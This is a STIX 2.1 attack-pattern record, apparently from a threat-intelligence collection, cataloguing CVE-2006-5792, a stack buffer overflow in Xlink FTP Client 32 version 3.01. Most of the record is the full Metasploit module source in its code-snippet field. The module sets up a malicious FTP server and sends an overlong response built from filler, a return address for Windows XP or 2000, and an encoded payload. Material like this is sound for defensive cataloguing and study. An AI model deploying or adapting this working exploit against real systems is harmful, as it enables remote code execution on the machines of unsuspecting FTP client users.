{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3a35aff-13a7-42ce-a789-752b4af4d1de",
    "created": "2024-08-14T16:51:16.522174Z",
    "modified": "2024-08-14T16:51:16.522178Z",
    "name": "Xlink FTP Client Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Xlink FTP Client 32 Version 3.01 that comes bundled with Omni-NFS Enterprise 5.2. When an overly long FTP server response is received by a client arbitrary code may be executed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/xlink_client.rb",
            "external_id": "xlink_client.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5792"
        },
        {
            "source_name": "reference",
            "url": "http://www.xlink.com"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Xlink FTP Client Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Xlink FTP Client 32\n        Version 3.01 that comes bundled with Omni-NFS Enterprise 5.2.\n        When an overly long FTP server response is received by a client,\n        arbitrary code may be executed.\n      },\n      'Author' \t => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-5792' ],\n          [ 'OSVDB', '33969' ],\n          [ 'URL', 'http://www.xlink.com' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 550,\n          'BadChars' => \"\\x00\\x0a\\x0d\\().,\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP Pro SP3 English', { 'Ret' => 0x7d054897 } ],\n          [ 'Windows 2000 SP4 English', \t{ 'Ret' => 0x7ce02a2d } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-10-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The FTP daemon port to listen on\", 21 ]),\n      ])\n  end\n\n  def on_client_connect(client)\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    sploit =  rand_text_alpha_upper(260) + [target.ret].pack('V') + payload.encoded\n    sploit << rand_text_alpha_upper(1024 - payload.encoded.length) + \"\\r\\n\"\n\n    print_status(\"Sending #{self.name}...\")\n    client.put(sploit)\n\n    handler(client)\n    service.close_client(client)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-03",
    "x_mitre_platforms": [
        "win'"
    ]
}